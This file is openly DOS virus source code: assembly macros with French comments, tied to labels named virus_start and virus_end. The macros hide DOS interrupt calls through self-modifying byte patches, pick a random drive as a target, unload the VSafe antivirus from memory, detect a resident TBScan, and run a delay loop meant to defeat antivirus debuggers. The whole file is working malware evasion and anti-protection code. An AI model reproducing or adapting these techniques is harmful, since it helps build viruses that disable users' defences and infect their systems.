;***************************************************************
; Renvoi l'heure (Secondes en DH, centiŠmes en DL)            
;***************************************************************
Find_time macro                                              
                ; Modifie le int                             
                mov     byte ptr cs:[bp+offset repere_int - offset virus_start],0CDh
                call    virus_end ; Force d‚chargement et rechargement du cache code (cr‚e Warning)
                ; Test al‚atoire                               
                mov     ah,2Ch    ; Fonction 2Ch: Lire heure   
repere_int:     db      0B2h,21h  ; B221=Mov dl,21h … remplacer par CD21= Int 21h
                ; Remodifie le int                             
                mov     byte ptr cs:[bp+offset repere_int - offset virus_start],0B2h
                ; On utilise un des prochains call pour recharge cache code
endm                                                           
                                                               
                                                               
;*************************************************************** 
; Renvoi la date (Mois en DH, jour en DL)                      
;*************************************************************** 
Find_date macro                                                
                ; Modifie le int                               
                mov     byte ptr cs:[bp+offset repere_int2 - offset virus_start],0CDh
                call    virus_end ; Force d‚chargement et rechargement du cache code (cr‚e Warning)
                ; Test al‚atoire                               
                mov     ah,2Ah    ; Fonction 2Ah: Lire date    
repere_int2:    db      0B2h,21h  ; B221=Mov dl,21h … remplacer par CD21= Int 21h
                ; Remodifie le int                             
                mov     byte ptr cs:[bp+offset repere_int2 - offset virus_start],0B2h
                ; On utilise un des prochains call pour recharge cache code
endm                                                           
                                                               
                                                               
;*********************************************************************
; D‚termine disque valide dans usefile … partir de valeur de DL (0-31)
; Retour: Modification de usefile global ( -> 'c:' ou 'd:' ...)
;********************************************************************* 
Wich_disk macro
                and     dl,1Fh      ; Prend zone valeur al‚atoire de 0 … 31
                mov     bx,0005h    ; Met bh … 0 et bl … 5               
boucle_test:    dec     bl                                                 
                shr     dl,1                                               
                jnz     short boucle_test ; Saut si dl pas encore nul            
                add     bl,3                                               
test_drive:     mov     ax,4408h
                int     21h                                                
                jc      short drive_error ; Saut si erreur fonction
                cmp	ax,1h
		jz      short drive_ok    ; Saut si drive_ok (amovible)
drive_error:    cmp	bl,3h
                jbe     drive_ok          ; Saut si drive <= 'c:'
                dec     bl
		jmp     short test_drive                                         
drive_ok:       add     bx,3A60h    ; Met 'x:' dans bx (x forc‚ment valide)
                ; Usefile='x:'
                mov     word ptr cs:[bp+offset usefile-offset virus_start],bx
                mov     byte ptr cs:[bp+offset usefile-offset virus_start+2],00h
endm              
                  
                  
;***************************************************************
; Teste si sytŠme prot‚g‚ par un controlleur int‚grit‚
; Renvoi z=0:Non, z=1:Oui
;***************************************************************
Antivirus_test macro
                ; Remove Vsafe from memory
                ; Modifie le int                               
		mov	ax,0FA01h ; Function FAh, subfunction 1
                mov     byte ptr cs:[bp+offset repere_int3 - offset virus_start],0CDh
		mov	dx,5945h
                push    ax
        	call    virus_end ; Force d‚chargement et rechargement du cache code (cr‚e Warning)
		pop 	ax
repere_int3:    db      0B2h,21h  ; B221=Mov dl,21h … remplacer par CD21= Int 21h
                ; Remodifie le int                             
                mov     byte ptr cs:[bp+offset repere_int3 - offset virus_start],0B2h
                ; On utilise un des prochains call pour recharge cache code
		; TBScanx pr‚sent ?
                mov     ax,0CA00h
                mov     bx,'TB'
                int     2Fh
                cmp     bx,'tb'
fin:            ; z=0:No integrity checker found, z=1:Integrity Checker found
endm            
           
           
;***************************************************************
; Boucle inutile utilis‚e contre debuger Antivirus
;***************************************************************
Boucle_antidebug macro     
                mov     cx,0FFFFh
boucle:         dec     cx
                jnz     boucle
endm